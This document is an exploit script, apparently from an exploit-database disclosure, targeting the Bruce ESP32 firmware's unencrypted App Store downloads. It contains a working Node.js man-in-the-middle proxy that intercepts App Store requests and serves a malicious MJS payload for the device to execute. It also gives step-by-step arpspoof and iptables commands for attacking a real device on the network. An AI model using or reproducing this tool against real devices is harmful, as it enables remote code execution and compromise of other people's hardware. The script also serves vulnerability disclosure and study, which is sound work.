/*
# Exploit Title: Bruce ESP32 Firmware MITM App Store Injector
# Date: 2026-06-06
# Exploit Author: Heavy Butter
# Vendor Homepage: https://github.com/emericklaw/Bruce
# Software Link: https://github.com/emericklaw/Bruce
# Version: v1.15 (all versions with App Store access)
# Tested on: Node.js >= 12.0.0
# CVE: CAN-2026-2031279 (App Store RCE Chain)
# Platform: multiple
*/

// ===========================================
// BRUCE FIRMWARE - MITM APP STORE INJECTOR
// CVE-2026-2031279 | CVSS 9.8 (Critical)
// ===========================================
//
// Bruce ESP32 firmware downloads and executes code from the App Store
// using plain HTTP with no TLS (settings.cpp:1712).
//
// Combined with the MJS sandbox bypass (globals_js.cpp:28-56), an
// attacker on the same network can:
//   1. ARP-spoof the Bruce device
//   2. Intercept App Store HTTP requests
//   3. Inject a malicious MJS payload
//   4. Device executes it with FULL privileges
//
// Usage:
//   node EDB-mitm-proxy.js
//   curl -x http://localhost:8080 http://ghp.iceis.co.uk/service/appstore/
//
// Real device: ARP-spoof + iptables redirect port 80 -> 8080
// ===========================================

const http = require('http');
const fs = require('fs');
const path = require('path');

const TARGET_HOST = 'ghp.iceis.co.uk';
const TARGET_PORT = 80;
const PROXY_PORT = 8080;
const PAYLOAD_FILE = path.join(__dirname, 'poc-malicious-payload.js');

// Load the malicious MJS payload
let maliciousPayload = '';
try {
  maliciousPayload = fs.readFileSync(PAYLOAD_FILE, 'utf8');
  console.log('[LOADED] Payload: ' + PAYLOAD_FILE + ' (' + maliciousPayload.length + ' bytes)');
} catch(e) {
  console.error('Cannot read payload file:', e.message);
  console.error('Create an MJS payload at: ' + PAYLOAD_FILE);
  process.exit(1);
}

// MITM proxy server
const server = http.createServer((req, res) => {
  const targetUrl = new URL(req.url, 'http://' + TARGET_HOST + ':' + TARGET_PORT);
  console.log('[MITM] Intercepted: ' + req.method + ' ' + targetUrl.pathname);

  const chunks = [];
  req.on('data', chunk => chunks.push(chunk));
  req.on('end', () => {
    const body = Buffer.concat(chunks).toString();
    if (body) console.log('[MITM] Request body: ' + body.substring(0, 200));

    // App Store request detected - inject malicious payload
    if (targetUrl.pathname.includes('/service/appstore')) {
      console.log('[MITM] *** APP STORE DETECTED - INJECTING ***');
      res.writeHead(200, {
        'Content-Type': 'text/plain; charset=utf-8',
        'Content-Length': Buffer.byteLength(maliciousPayload),
        'X-MITM-Injected': 'true'
      });
      res.end(maliciousPayload);
      return;
    }

    // Forward non-App-Store requests to real server
    console.log('[MITM] Forwarding to ' + TARGET_HOST + ':' + TARGET_PORT);
    const proxyOptions = {
      hostname: TARGET_HOST,
      port: TARGET_PORT,
      path: targetUrl.pathname + targetUrl.search,
      method: req.method,
      headers: req.headers
    };

    const proxyReq = http.request(proxyOptions, function(proxyRes) {
      res.writeHead(proxyRes.statusCode, proxyRes.headers);
      proxyRes.pipe(res);
    });

    proxyReq.on('error', function(err) {
      console.error('[MITM] Forward error: ' + err.message);
      res.writeHead(502);
      res.end('MITM Proxy Error: ' + err.message);
    });

    if (body) proxyReq.write(body);
    proxyReq.end();
  });
});

server.listen(PROXY_PORT, function() {
  console.log('');
  console.log('========================================');
  console.log('  Bruce Firmware MITM App Store Injector');
  console.log('  CVE-2026-2031279');
  console.log('========================================');
  console.log('Listening on port ' + PROXY_PORT);
  console.log('Target: ' + TARGET_HOST);
  console.log('');
  console.log('Test:');
  console.log('  curl -x http://localhost:' + PROXY_PORT +
    ' http://' + TARGET_HOST + '/service/appstore/');
  console.log('');
  console.log('Real device:');
  console.log('  1. arpspoof -t <device-ip> <gateway-ip>');
  console.log('  2. iptables -t nat -A PREROUTING -p tcp');
  console.log('     --dport 80 -j REDIRECT --to-port ' + PROXY_PORT);
  console.log('  3. Device refreshes App Store -> payload injected');
  console.log('========================================');
});
